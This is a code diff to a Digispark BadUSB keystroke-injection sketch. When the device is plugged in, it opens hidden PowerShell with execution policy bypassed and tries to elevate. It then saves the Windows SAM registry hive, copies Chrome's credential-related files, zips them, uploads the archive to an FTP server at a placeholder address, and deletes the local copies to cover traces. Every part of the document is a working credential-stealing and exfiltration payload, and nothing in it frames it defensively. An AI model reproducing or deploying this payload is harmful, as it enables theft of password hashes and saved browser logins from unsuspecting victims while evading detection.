@@ -4,7 +4,6 @@ void setup() {
 }
 
   char mode[] = "powershell -nop -win h -noni -exec bypass";
-  char separator[] = "exit";
 
 void loop() {
       digitalWrite(1, HIGH); // Turn on the red LED
@@ -14,24 +13,32 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.print(mode);
   DigiKeyboard.delay(500);
+   DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-	DigiKeyboard.delay(500);
-  DigiKeyboard.print(" mkdir D:\\browsercredentials");
+	 DigiKeyboard.delay(500);
+  DigiKeyboard.print(" mkdir D:\\files");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(600);
+  DigiKeyboard.print("reg save HKLM\\SAM d:\\files\\sam"); //copy sam or any other system files at different path
+  DigiKeyboard.delay(600);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(600);
+	DigiKeyboard.print("cd $env:USERPROFILE"); 
+  DigiKeyboard.delay(600);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(600);
 	DigiKeyboard.print("cd AppData\\Local\\Google\\chrome\\'User Data'");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(600);
-	DigiKeyboard.print("copy 'Local State' D:\\browsercredentials\\");
-	DigiKeyboard.sendKeyStroke(KEY_ENTER);
-	DigiKeyboard.delay(600);
-	DigiKeyboard.print("copy Default\\'Login Data' D:\\browsercredentials");
+	DigiKeyboard.print("copy 'Local State' D:\\files\\");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(600);
 	DigiKeyboard.print("cd D:\\");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(600);
-	DigiKeyboard.print("Compress-Archive browsercredentials browsercredentials.zip");
+	DigiKeyboard.print("Compress-Archive files files.zip");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(1500);
   DigiKeyboard.print("ftp {ip_address}"); //accessing ftp server
@@ -50,24 +57,26 @@ void loop() {
   DigiKeyboard.print("prompt"); 
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("put browsercredentials.zip");
+	DigiKeyboard.delay(600);
+  DigiKeyboard.print("put files.zip");
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);
   DigiKeyboard.print("bye");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);
-  DigiKeyboard.print("del browsercredentials");
+  DigiKeyboard.print("del files");
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.print("y"); 
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("del browsercredentials.zip");
+  DigiKeyboard.print("del files.zip");
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(5000);
-  for(;;){ }
+  DigiKeyboard.delay(600);
+  digitalWrite(1, LOW); // Turn off the red LED
+  while(1){}
 }
